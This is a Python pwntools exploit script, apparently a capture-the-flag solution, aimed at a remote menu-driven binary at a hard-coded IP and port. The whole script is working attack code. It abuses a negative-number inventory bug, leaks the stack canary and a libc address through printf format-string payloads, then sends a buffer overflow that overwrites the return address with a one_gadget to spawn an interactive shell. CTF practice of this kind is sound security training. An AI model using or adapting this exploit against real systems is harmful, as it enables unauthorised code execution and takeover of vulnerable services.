from pwn import *

if __name__ == "__main__":
    io = remote("46.101.22.121", 32601)
    #io = remote("localhost", 8001)

    # libc address located at offset 21 on the stack
    libc_leak_offset = 0x00007f94f5e12bf7 - 0x00007f94f5df1000

    one_gadget_offset =  0x4f3d5
    #one_gadget_offset = 0x4f432
    #one_gadget_offset = 0x10a41c   

    # check inventory and drop negative number to increase
    io.recvuntil("> ")
    io.sendline("2")
    io.recvuntil("> ")
    io.sendline("y")
    io.recvuntil("> ")
    io.sendline("-11")
    io.recvuntil("> ")

    # stare with 21 pies to trigger read
    io.sendline("3")
    io.recvuntil("> ")
    io.sendline("AAAA")
    io.recvuntil("> ")

    # printf vulnerability to leak canary
    io.sendline("1")
    io.recvuntil("> ")
    io.sendline("%15$p")

    res = io.recvuntil("> ")
    res = res.split(b"\n")[1]
    res = res.split(b": ")[1].split(b"\x1b")[0]
    canary = p64(int(res.decode(), 16))
    
    print("canary: ", hex(u64(canary)))

    # reset inventory trigger by dropping one pie
    io.sendline("2")
    io.recvuntil("> ")
    io.sendline("y")
    io.recvuntil("> ")
    io.sendline("1")
    io.recvuntil("> ")

    # printf vulnerability to leak address within libc
    io.sendline("1")
    io.recvuntil("> ")
    io.sendline("%21$p")

    res = io.recvuntil("> ")
    res = res.split(b"\n")[1]
    res = res.split(b": ")[1].split(b"\x1b")[0]
    libc_leak = int(res.decode(), 16)
    libc_base = libc_leak - libc_leak_offset
    one_gadget = p64(libc_base + one_gadget_offset)

    payload = b"A" * 0x28
    payload += canary
    payload += b"A" * 8
    payload += one_gadget
    print(len(payload))

    io.sendline("3")
    io.recvuntil("> ")
    io.sendline(payload)

    io.interactive()
